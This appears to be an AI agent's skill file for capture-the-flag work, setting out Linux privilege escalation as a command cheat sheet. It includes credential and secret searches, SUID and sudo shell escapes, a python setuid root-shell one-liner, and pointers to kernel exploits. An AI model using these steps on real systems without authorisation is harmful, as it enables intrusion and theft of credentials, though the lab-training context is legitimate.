---
name: linux-privesc
when: you have a shell as a non-root user and the flag needs higher privilege
tools: [session, shell]
phase: escalate
---
# Linux privilege escalation

Enumerate first with the baked-in tools — `linpeas.sh` for a full sweep, and `pspy`
(`pspy64`) to watch cron/root processes with no root (catches a timed root job you
can hijack) — then confirm by hand:
```
id; sudo -l                                   # sudo rights - GTFOBins the allowed binary
find / -perm -4000 -type f 2>/dev/null        # SUID - check GTFOBins for each
getcap -r / 2>/dev/null                        # capabilities (cap_setuid, etc.)
cat /etc/crontab; ls -la /etc/cron.*           # writable script run as root?
ps aux --forest; netstat -tlpn                 # root services, localhost-only ports
uname -a; cat /etc/os-release                  # kernel exploit? (last resort)
ls -la /home/*/ /root 2>/dev/null; cat ~/.bash_history
grep -RiE 'password|secret|api[_-]?key' /var/www /etc /opt /home 2>/dev/null
```
`pspy` is the way to SEE a root cron/service fire on a timer; run it, wait a cycle,
then attack the writable script/binary it revealed.
Common wins:
- `sudo -l` allows a binary -> GTFOBins escape (e.g. `sudo vim -c ':!/bin/sh'`, `sudo find . -exec sh \;`).
- SUID GTFOBins binary -> spawn a root shell.
- Writable cron/script/service run as root -> drop a payload and wait.
- cap_setuid on python/perl -> `python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'`.
- Reused/plaintext creds -> `su` (needs a PTY: run it inside a `session`, not one-shot `shell`), or ssh as another user.
- Kernel exploit (DirtyPipe/DirtyCow/pwnkit) only if nothing else - `searchsploit linux kernel <ver>`.
Read the root/user flag once escalated; submit it. See `credential-hunting`.
